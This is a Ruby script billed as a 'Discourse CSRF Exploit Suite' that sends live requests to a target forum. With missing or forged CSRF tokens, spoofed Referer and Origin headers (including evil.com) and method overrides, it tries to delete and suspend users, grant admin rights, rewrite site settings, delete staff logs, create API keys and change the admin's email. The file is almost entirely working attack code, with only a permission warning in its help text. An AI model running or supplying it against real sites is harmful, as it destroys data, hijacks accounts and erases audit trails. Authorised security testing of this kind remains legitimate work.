#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'cgi'
require 'nokogiri'
require 'base64'

class DiscourseCSRF
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting CSRF vulnerability tests on #{@target_url}"
    puts "=" * 60
    
    # Basic CSRF tests
    test_csrf_protection_bypass
    test_missing_csrf_tokens
    test_csrf_token_validation
    
    # State-changing operations
    test_user_management_csrf
    test_admin_operations_csrf
    test_post_operations_csrf
    test_settings_csrf
    
    # Advanced CSRF techniques
    test_csrf_via_referer
    test_csrf_via_origin
    test_csrf_via_content_type
    test_csrf_via_method_override
    
    # JSON CSRF
    test_json_csrf
    
    # File upload CSRF
    test_file_upload_csrf
    
    # Plugin-specific CSRF
    test_plugin_csrf
    
    print_results
    save_results
    
    @results
  end
  
  def test_csrf_protection_bypass
    puts "\n[*] Testing CSRF protection bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    # Test endpoints without CSRF protection
    endpoints = [
      { path: '/session', method: 'POST', data: { login: 'admin', password: 'password' } },
      { path: '/users', method: 'POST', data: { name: 'testuser', email: 'test@example.com' } },
      { path: '/admin/users/sync_sso', method: 'POST', data: {} },
      { path: '/posts', method: 'POST', data: { raw: 'CSRF Test Post', topic_id: 1 } },
      { path: '/t/1/posts', method: 'POST', data: { raw: 'CSRF Reply' } }
    ]
    
    endpoints.each do |endpoint|
      test_csrf_endpoint(endpoint[:path], endpoint[:method], endpoint[:data], 'CSRF Protection Bypass')
    end
  end
  
  def test_missing_csrf_tokens
    puts "\n[*] Testing for missing CSRF tokens..."
    @results[:summary][:total_tests] += 1
    
    # Test state-changing operations without CSRF tokens
    operations = [
      { path: '/admin/users/1/delete', method: 'DELETE' },
      { path: '/admin/users/1/suspend', method: 'PUT', data: { suspend_until: '2024-12-31' } },
      { path: '/admin/users/1/silence', method: 'PUT', data: { silenced_till: '2024-12-31' } },
      { path: '/admin/site_settings', method: 'PUT', data: { allow_uncategorized_topics: false } },
      { path: '/posts/1', method: 'DELETE' },
      { path: '/posts/1/recover', method: 'PUT' }
    ]
    
    operations.each do |op|
      # Test without any CSRF token
      response = make_request_without_csrf(op[:path], op[:method], op[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Missing CSRF Token',
          endpoint: op[:path],
          method: op[:method],
          payload: op[:data] || {},
          severity: 'High',
          evidence: ["Response code: #{response.code}", 'No CSRF token required'],
          description: 'State-changing operation allowed without CSRF token'
        })
      end
    end
  end
  
  def test_csrf_token_validation
    puts "\n[*] Testing CSRF token validation..."
    @results[:summary][:total_tests] += 1
    
    # Test with invalid CSRF tokens
    invalid_tokens = [
      'invalid_token',
      '',
      'a' * 32,
      Base64.encode64('fake_token').strip,
      @csrf_token&.reverse,  # Reversed valid token
      @csrf_token&.upcase,   # Case changed
      'null',
      'undefined'
    ]
    
    test_endpoint = '/posts'
    test_data = { raw: 'CSRF Test', topic_id: 1 }
    
    invalid_tokens.each do |token|
      response = make_request_with_custom_csrf(test_endpoint, 'POST', test_data, token)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Invalid CSRF Token Accepted',
          endpoint: test_endpoint,
          method: 'POST',
          payload: test_data,
          severity: 'High',
          evidence: ["Response code: #{response.code}", "Invalid token: #{token}"],
          description: 'Invalid CSRF token was accepted'
        })
      end
    end
  end
  
  def test_user_management_csrf
    puts "\n[*] Testing user management CSRF..."
    @results[:summary][:total_tests] += 1
    
    user_operations = [
      { path: '/admin/users', method: 'POST', data: { name: 'csrf_user', email: 'csrf@test.com', password: 'password123' } },
      { path: '/admin/users/1/grant_admin', method: 'PUT' },
      { path: '/admin/users/1/revoke_admin', method: 'PUT' },
      { path: '/admin/users/1/grant_moderation', method: 'PUT' },
      { path: '/admin/users/1/revoke_moderation', method: 'PUT' },
      { path: '/admin/users/1/approve', method: 'PUT' },
      { path: '/admin/users/1/activate', method: 'PUT' },
      { path: '/admin/users/1/deactivate', method: 'PUT' },
      { path: '/admin/users/1/log_out', method: 'POST' },
      { path: '/admin/users/1/refresh_browsers', method: 'POST' }
    ]
    
    user_operations.each do |op|
      test_csrf_endpoint(op[:path], op[:method], op[:data], 'User Management CSRF')
    end
  end
  
  def test_admin_operations_csrf
    puts "\n[*] Testing admin operations CSRF..."
    @results[:summary][:total_tests] += 1
    
    admin_operations = [
      { path: '/admin/site_settings', method: 'PUT', data: { title: 'CSRF Hacked Site' } },
      { path: '/admin/customize/themes', method: 'POST', data: { theme: { name: 'csrf_theme' } } },
      { path: '/admin/plugins', method: 'PUT', data: { enabled: true } },
      { path: '/admin/backups', method: 'POST', data: { with_uploads: true } },
      { path: '/admin/email/test', method: 'POST', data: { email_address: 'test@evil.com' } },
      { path: '/admin/customize/email_templates/1', method: 'PUT', data: { subject: 'Hacked' } },
      { path: '/admin/logs/staff_action_logs.json', method: 'DELETE' },
      { path: '/admin/api/keys', method: 'POST', data: { description: 'CSRF API Key' } }
    ]
    
    admin_operations.each do |op|
      test_csrf_endpoint(op[:path], op[:method], op[:data], 'Admin Operations CSRF')
    end
  end
  
  def test_post_operations_csrf
    puts "\n[*] Testing post operations CSRF..."
    @results[:summary][:total_tests] += 1
    
    post_operations = [
      { path: '/posts', method: 'POST', data: { raw: 'CSRF created post', topic_id: 1 } },
      { path: '/posts/1', method: 'PUT', data: { post: { raw: 'CSRF edited post' } } },
      { path: '/posts/1', method: 'DELETE' },
      { path: '/posts/1/recover', method: 'PUT' },
      { path: '/posts/1/bookmark', method: 'PUT' },
      { path: '/posts/1/wiki', method: 'PUT', data: { wiki: true } },
      { path: '/post_actions', method: 'POST', data: { id: 1, post_action_type_id: 2 } },
      { path: '/post_actions/1', method: 'DELETE' },
      { path: '/posts/1/reply-history', method: 'PUT' }
    ]
    
    post_operations.each do |op|
      test_csrf_endpoint(op[:path], op[:method], op[:data], 'Post Operations CSRF')
    end
  end
  
  def test_settings_csrf
    puts "\n[*] Testing settings CSRF..."
    @results[:summary][:total_tests] += 1
    
    settings_operations = [
      { path: '/u/admin/preferences/username', method: 'PUT', data: { new_username: 'csrf_hacked' } },
      { path: '/u/admin/preferences/email', method: 'PUT', data: { email: 'csrf@evil.com' } },
      { path: '/u/admin/preferences', method: 'PUT', data: { bio_raw: 'CSRF hacked bio' } },
      { path: '/u/admin/preferences/avatar/pick', method: 'PUT', data: { upload_id: 1 } },
      { path: '/u/admin/preferences/badge_title', method: 'PUT', data: { user_badge_id: 1 } },
      { path: '/user_api_keys', method: 'POST', data: { application_name: 'CSRF App' } },
      { path: '/user_api_keys/1/revoke', method: 'POST' }
    ]
    
    settings_operations.each do |op|
      test_csrf_endpoint(op[:path], op[:method], op[:data], 'Settings CSRF')
    end
  end
  
  def test_csrf_via_referer
    puts "\n[*] Testing CSRF via Referer bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test with different referer values
    referer_values = [
      nil,  # No referer
      '',   # Empty referer
      @target_url,  # Same origin
      "#{@target_url}/",  # Same origin with trailing slash
      'http://evil.com',  # Different origin
      "#{@target_url}.evil.com",  # Subdomain confusion
      "evil.com#{@target_url}",   # Domain confusion
      'data:text/html,<script>alert(1)</script>'  # Data URI
    ]
    
    test_endpoint = '/posts'
    test_data = { raw: 'CSRF Referer Test', topic_id: 1 }
    
    referer_values.each do |referer|
      response = make_request_with_referer(test_endpoint, 'POST', test_data, referer)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'CSRF Referer Bypass',
          endpoint: test_endpoint,
          method: 'POST',
          payload: test_data,
          severity: 'Medium',
          evidence: ["Response code: #{response.code}", "Referer: #{referer || 'None'}"],
          description: 'CSRF protection bypassed via Referer manipulation'
        })
      end
    end
  end
  
  def test_csrf_via_origin
    puts "\n[*] Testing CSRF via Origin bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test with different origin values
    origin_values = [
      nil,  # No origin
      '',   # Empty origin
      'null',  # Null origin
      @target_url,  # Same origin
      'http://evil.com',  # Different origin
      "#{@target_url}.evil.com",  # Subdomain confusion
      "evil#{@target_url}",  # Prefix confusion
      'file://',  # File protocol
      'data:'     # Data protocol
    ]
    
    test_endpoint = '/posts'
    test_data = { raw: 'CSRF Origin Test', topic_id: 1 }
    
    origin_values.each do |origin|
      response = make_request_with_origin(test_endpoint, 'POST', test_data, origin)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'CSRF Origin Bypass',
          endpoint: test_endpoint,
          method: 'POST',
          payload: test_data,
          severity: 'Medium',
          evidence: ["Response code: #{response.code}", "Origin: #{origin || 'None'}"],
          description: 'CSRF protection bypassed via Origin manipulation'
        })
      end
    end
  end
  
  def test_csrf_via_content_type
    puts "\n[*] Testing CSRF via Content-Type bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test with different content types
    content_types = [
      'text/plain',
      'application/json',
      'application/x-www-form-urlencoded',
      'multipart/form-data',
      'text/xml',
      'application/xml',
      'text/html',
      'application/octet-stream'
    ]
    
    test_endpoint = '/posts'
    test_data = { raw: 'CSRF Content-Type Test', topic_id: 1 }
    
    content_types.each do |content_type|
      response = make_request_with_content_type(test_endpoint, 'POST', test_data, content_type)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'CSRF Content-Type Bypass',
          endpoint: test_endpoint,
          method: 'POST',
          payload: test_data,
          severity: 'Medium',
          evidence: ["Response code: #{response.code}", "Content-Type: #{content_type}"],
          description: 'CSRF protection bypassed via Content-Type manipulation'
        })
      end
    end
  end
  
  def test_csrf_via_method_override
    puts "\n[*] Testing CSRF via HTTP method override..."
    @results[:summary][:total_tests] += 1
    
    # Test method override techniques
    override_methods = [
      { header: 'X-HTTP-Method-Override', value: 'PUT' },
      { header: 'X-HTTP-Method-Override', value: 'DELETE' },
      { header: 'X-Method-Override', value: 'PUT' },
      { header: 'X-Method-Override', value: 'DELETE' },
      { param: '_method', value: 'PUT' },
      { param: '_method', value: 'DELETE' },
      { param: 'method', value: 'PUT' },
      { param: 'method', value: 'DELETE' }
    ]
    
    test_endpoint = '/posts/1'
    test_data = { post: { raw: 'CSRF Method Override Test' } }
    
    override_methods.each do |override|
      if override[:header]
        response = make_request_with_method_override_header(test_endpoint, 'POST', test_data, override[:header], override[:value])
      else
        data_with_override = test_data.merge(override[:param] => override[:value])
        response = make_post_request("#{@target_url}#{test_endpoint}", data_with_override)
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'CSRF Method Override',
          endpoint: test_endpoint,
          method: 'POST',
          payload: test_data,
          severity: 'Medium',
          evidence: ["Response code: #{response.code}", "Override: #{override}"],
          description: 'CSRF protection bypassed via HTTP method override'
        })
      end
    end
  end
  
  def test_json_csrf
    puts "\n[*] Testing JSON CSRF vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Test JSON endpoints
    json_endpoints = [
      { path: '/posts.json', data: { raw: 'JSON CSRF Test', topic_id: 1 } },
      { path: '/admin/users.json', data: { name: 'json_user', email: 'json@test.com' } },
      { path: '/admin/site_settings.json', data: { title: 'JSON CSRF' } },
      { path: '/user_api_keys.json', data: { application_name: 'JSON CSRF App' } }
    ]
    
    json_endpoints.each do |endpoint|
      # Test with different content types for JSON
      ['application/json', 'text/plain', 'application/x-www-form-urlencoded'].each do |content_type|
        response = make_json_request(endpoint[:path], endpoint[:data], content_type)
        
        if response && response.code.to_i < 400
          add_vulnerability({
            test_type: 'JSON CSRF',
            endpoint: endpoint[:path],
            method: 'POST',
            payload: endpoint[:data],
            severity: 'High',
            evidence: ["Response code: #{response.code}", "Content-Type: #{content_type}"],
            description: 'JSON endpoint vulnerable to CSRF'
          })
        end
      end
    end
  end
  
  def test_file_upload_csrf
    puts "\n[*] Testing file upload CSRF..."
    @results[:summary][:total_tests] += 1
    
    # Test file upload endpoints
    upload_endpoints = [
      '/uploads.json',
      '/admin/backups/upload',
      '/admin/themes/import',
      '/admin/customize/themes/import'
    ]
    
    # Create test file content
    file_content = "Test file for CSRF\n#{Time.now}"
    
    upload_endpoints.each do |endpoint|
      response = make_file_upload_request(endpoint, file_content, 'test.txt')
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'File Upload CSRF',
          endpoint: endpoint,
          method: 'POST',
          payload: 'File upload',
          severity: 'High',
          evidence: ["Response code: #{response.code}", 'File upload without CSRF protection'],
          description: 'File upload endpoint vulnerable to CSRF'
        })
      end
    end
  end
  
  def test_plugin_csrf
    puts "\n[*] Testing plugin-specific CSRF..."
    @results[:summary][:total_tests] += 1
    
    # Common plugin endpoints
    plugin_endpoints = [
      { path: '/chat/api/channels', method: 'POST', data: { name: 'csrf_channel' } },
      { path: '/polls', method: 'POST', data: { poll: { options: ['Yes', 'No'] } } },
      { path: '/voting/vote', method: 'POST', data: { post_id: 1, direction: 'up' } },
      { path: '/calendar/events', method: 'POST', data: { name: 'CSRF Event' } },
      { path: '/kanban/boards', method: 'POST', data: { name: 'CSRF Board' } }
    ]
    
    plugin_endpoints.each do |endpoint|
      test_csrf_endpoint(endpoint[:path], endpoint[:method], endpoint[:data], 'Plugin CSRF')
    end
  end
  
  def test_csrf_endpoint(path, method, data, test_type)
    # Test without CSRF token
    response = make_request_without_csrf(path, method, data)
    
    if response && response.code.to_i < 400
      severity = determine_csrf_severity(path, method)
      
      add_vulnerability({
        test_type: test_type,
        endpoint: path,
        method: method,
        payload: data || {},
        severity: severity,
        evidence: ["Response code: #{response.code}", 'No CSRF protection'],
        description: "#{test_type} vulnerability in #{path}"
      })
    end
  end
  
  def determine_csrf_severity(path, method)
    # Critical: Admin operations
    if path.include?('/admin/')
      return 'Critical'
    end
    
    # High: User management, destructive operations
    if path.include?('/users/') || method == 'DELETE' || path.include?('delete')
      return 'High'
    end
    
    # Medium: Other state-changing operations
    'Medium'
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def make_request_without_csrf(path, method, data = nil)
    uri = URI("#{@target_url}#{path}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    make_request(uri, method, body, headers)
  end
  
  def make_request_with_custom_csrf(path, method, data, csrf_token)
    uri = URI("#{@target_url}#{path}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => csrf_token,
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    make_request(uri, method, body, headers)
  end
  
  def make_request_with_referer(path, method, data, referer)
    uri = URI("#{@target_url}#{path}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    headers['Referer'] = referer if referer
    
    make_request(uri, method, body, headers)
  end
  
  def make_request_with_origin(path, method, data, origin)
    uri = URI("#{@target_url}#{path}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    headers['Origin'] = origin if origin
    
    make_request(uri, method, body, headers)
  end
  
  def make_request_with_content_type(path, method, data, content_type)
    uri = URI("#{@target_url}#{path}")
    
    body = case content_type
    when 'application/json'
      data.to_json
    else
      data ? URI.encode_www_form(data) : nil
    end
    
    headers = {
      'Content-Type' => content_type,
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    make_request(uri, method, body, headers)
  end
  
  def make_request_with_method_override_header(path, method, data, header_name, header_value)
    uri = URI("#{@target_url}#{path}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-Requested-With' => 'XMLHttpRequest',
      header_name => header_value
    }
    
    make_request(uri, method, body, headers)
  end
  
  def make_json_request(path, data, content_type)
    uri = URI("#{@target_url}#{path}")
    
    body = case content_type
    when 'application/json'
      data.to_json
    when 'text/plain'
      data.to_json  # JSON in text/plain
    else
      URI.encode_www_form(data)
    end
    
    headers = {
      'Content-Type' => content_type,
      'Accept' => 'application/json'
    }
    
    make_request(uri, 'POST', body, headers)
  end
  
  def make_file_upload_request(path, file_content, filename)
    uri = URI("#{@target_url}#{path}")
    
    boundary = "----WebKitFormBoundary#{rand(1000000000)}"
    
    body = "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"#{filename}\"\r\n"
    body += "Content-Type: text/plain\r\n\r\n"
    body += file_content
    body += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}"
    }
    
    make_request(uri, 'POST', body, headers)
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} CSRF found: #{vuln_data[:endpoint]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE CSRF TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_csrf_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse CSRF Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_csrf.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_csrf.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseCSRF.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: CSRF vulnerabilities found!"
      puts "   Cross-site request forgery attacks possible!"
    else
      puts "\n‚úÖ No CSRF vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end